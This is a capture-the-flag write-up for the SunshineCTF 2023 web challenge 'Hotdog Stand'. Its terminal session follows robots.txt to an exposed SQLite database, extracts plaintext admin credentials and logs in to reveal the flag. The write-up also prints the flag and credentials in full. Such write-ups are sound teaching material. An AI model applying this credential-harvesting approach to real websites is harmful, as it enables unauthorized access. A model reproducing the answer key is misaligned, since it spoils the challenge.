# Hotdog Stand

## Description

> In the not-so-distant future, robots have taken over the fast-food industry. Infiltrate the robot hotdog stand to find out whatjobs still remain.
>
> <https://hotdog.web.2023.sunshinectf.games>

## Flag

sun{5l1c3d_p1cKl35_4nd_0N10N2}

## Solution

1. Access robots.txt
1. Download SQLite3 database file named `robot_data.db` in <https://hotdog.web.2023.sunshinectf.games/hotdog-database/>
1. Extract login credential from `robot_data.db`
1. Login

```console
root@kali:~/ctf/SunshineCTF_2023/Web/Hotdog Stand# curl -ks https://hotdog.web.2023.sunshinectf.games/robots.txt
User-agent: *
Disallow: /configs/
Disallow: /backups/
Disallow: /hotdog-database/

root@kali:~/ctf/SunshineCTF_2023/Web/Hotdog Stand# curl -ks -D- https://hotdog.web.2023.sunshinectf.games/hotdog-database/
HTTP/2 200
server: nginx/1.18.0 (Ubuntu)
date: Tue, 10 Oct 2023 07:35:59 GMT
content-type: application/octet-stream
content-length: 24576
content-disposition: attachment; filename=robot_data.db
last-modified: Sun, 08 Oct 2023 13:23:12 GMT
cache-control: no-cache
etag: "1696771392.0-24576-566890146"

root@kali:~/ctf/SunshineCTF_2023/Web/Hotdog Stand# curl -ks -o robot_data.db https://hotdog.web.2023.sunshinectf.games/hotdog-database/

root@kali:~/ctf/SunshineCTF_2023/Web/Hotdog Stand# file robot_data.db
robot_data.db: SQLite 3.x database, last written using SQLite version 3041002, file counter 21, database pages 6, cookie 0x4, schema 4, UTF-8, version-valid-for 21

root@kali:~/ctf/SunshineCTF_2023/Web/Hotdog Stand# sqlite3 robot_data.db
SQLite version 3.42.0 2023-05-16 12:36:15
Enter ".help" for usage hints.
sqlite> .tables
credentials       customer_reviews  menu_items        robot_logs
sqlite> .schema credentials
CREATE TABLE credentials(
   id INTEGER PRIMARY KEY AUTOINCREMENT,
   username TEXT NOT NULL,
   password TEXT NOT NULL,
   role TEXT
);
sqlite> SELECT * FROM credentials;
1|hotdogstand|slicedpicklesandonions|admin
sqlite>

root@kali:~/ctf/SunshineCTF_2023/Web/Hotdog Stand# curl -b cookie.txt -ksL -F username=hotdogstand -F password=slicedpicklesandonions https://hotdog.web.2023.sunshinectf.games/login | grep 'sun{'
        <p>Please take your authentication token: <span class="flag">sun{5l1c3d_p1cKl35_4nd_0N10N2}</span></p>
```
